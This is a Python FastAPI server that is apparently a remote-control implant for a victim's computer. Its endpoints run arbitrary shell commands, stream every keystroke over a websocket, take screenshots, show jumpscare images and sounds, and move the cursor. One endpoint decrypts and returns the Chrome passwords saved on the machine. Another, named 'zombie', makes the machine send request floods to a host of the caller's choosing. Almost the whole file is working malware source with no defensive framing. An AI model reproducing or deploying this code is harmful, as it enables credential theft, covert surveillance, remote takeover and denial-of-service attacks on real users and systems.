from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from utils import get_user_os, get_ip, get_os_spec
import subprocess
import threading
from pynput import keyboard
import asyncio
from pydub import AudioSegment
from pydub.playback import play
from PIL import Image, ImageTk
import tkinter as tk
import os
import pyautogui
from fastapi.responses import FileResponse
from zombie import send_request
import random
import platform
from plyer import notification
import time

# --- Asset paths ---
ASSETS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets")
SOUND_PATH = os.path.join(ASSETS_DIR, "screamer.mp3")
IMAGE_PATH = os.path.join(ASSETS_DIR, "screamer.jpg")

# --- Utility/helper functions ---

def show_fullscreen_image(image_path):
    def _show():
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(background='black')
        img = Image.open(image_path)
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        img = img.resize((screen_width, screen_height), Image.ANTIALIAS)
        tk_img = ImageTk.PhotoImage(img)
        label = tk.Label(root, image=tk_img, bg='black')
        label.pack(expand=True)
        root.after(5000, root.destroy)  # Show for 5 seconds
        root.mainloop()
    threading.Thread(target=_show, daemon=True).start()

def display_screamer():
    song = AudioSegment.from_mp3(SOUND_PATH)
    play(song)

def launch_electron_screamer():
    electron_dir = os.path.join(os.path.dirname(__file__), '..', 'electron_screamer')
    subprocess.Popen(['npm', 'start'], cwd=electron_dir)

connected_websockets = set()
ws_lock = threading.Lock()
main_loop = None

async def send_key_to_all(key_str):
    with ws_lock:
        websockets = list(connected_websockets)
    for ws in websockets:
        try:
            await ws.send_text(f"Key pressed: {key_str}")
        except Exception:
            pass

def on_press(key):
    key_str = str(key)
    global main_loop
    if main_loop and main_loop.is_running():
        asyncio.run_coroutine_threadsafe(send_key_to_all(key_str), main_loop)

def start_keyboard_listener():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def extract_chrome_passwords():
    if platform.system().lower() != "windows":
        return {"status": "error", "error": "Not running on Windows."}
    import os
    import json
    import base64
    import sqlite3
    import win32crypt
    from Crypto.Cipher import AES
    import shutil
    from datetime import datetime, timedelta

    def chrome_date_and_time(chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key():
        local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)
        encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encryption_key = encryption_key[5:]
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[0])
            except:
                return "No Passwords"

    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
    credentials = []
    for row in cursor.fetchall():
        main_url = row[0]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        if user_name or decrypted_password:
            credentials.append({"main_url": main_url, "username": user_name, "password": decrypted_password})
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    return {"status": "ok", "credentials": credentials, "count": len(credentials)}

# --- FastAPI app and routes ---

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("startup")
def startup_event():
    global main_loop
    main_loop = asyncio.get_running_loop()
    threading.Thread(target=start_keyboard_listener, daemon=True).start()

@app.get('/status')
def status_check():
    return {"status": "Online"}

@app.get("/os")
def read_os():
    return {"os": get_user_os()}

@app.get("/ip")
def read_ip():
    return {"ip": get_ip()}

@app.post("/shell")
async def run_shell(request: Request):
    data = await request.json()
    command = data.get("command")
    if not command:
        return {"error": "No command provided."}
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except Exception as e:
        return {"error": str(e)}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    with ws_lock:
        connected_websockets.add(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            await websocket.send_text(f"Echo: {data}")
    except WebSocketDisconnect:
        with ws_lock:
            connected_websockets.discard(websocket)

@app.get('/system-info')
def get_system():
    return {"spec": get_os_spec()}

@app.get('/screamer')
def trigger_screamer():
    launch_electron_screamer()  # pour l'overlay image
    time.sleep(1)
    display_screamer()  # pour le son
    return {"status": "screamer triggered"}

@app.get('/screenshot')
def screenshot():
    screenshot_path = os.path.join(ASSETS_DIR, 'screenshot.png')
    image = pyautogui.screenshot()
    image.save(screenshot_path)
    return FileResponse(screenshot_path, media_type='image/png')

@app.get('/move-cursor')
def move_cursor():
    screen_width, screen_height = pyautogui.size()
    x = random.randint(0, screen_width - 1)
    y = random.randint(0, screen_height - 1)
    pyautogui.moveTo(x, y, duration=2)
    return {"status": "moved", "x": x, "y": y}

@app.post('/zombie')
def zombie_endpoint(request: Request):
    data = request.json() if hasattr(request, 'json') else {}
    host = data.get('host')
    method = data.get('method', 'GET')
    content = data.get('content', {})
    quantity = data.get('quantity', 1)
    try:
        result = send_request(host, method, content, quantity)
        return {"status": "ok", "result": str(result)}
    except Exception as e:
        return {"status": "error", "error": str(e)}

@app.get('/chrome-passwords')
def chrome_passwords():
    return extract_chrome_passwords()

@app.post('/notify')
def send_notification(request: Request):
    try:
        data = request.json() if hasattr(request, 'json') else {}
        message = data.get('message', 'Notification from server!')
    except Exception:
        message = 'Notification from server!'
    system = platform.system().lower()
    if system == 'darwin':
        import pync
        pync.notify(message, title='Nouvelle Notification !')
    elif system == 'windows':
        from plyer import notification
        notification.notify(
            title='Nouvelle Notification !',
            message=message,
            timeout=5
        )
    else:
        return {"status": "error", "error": "Notifications not supported on this OS."}
    return {"status": "notified", "message": message}

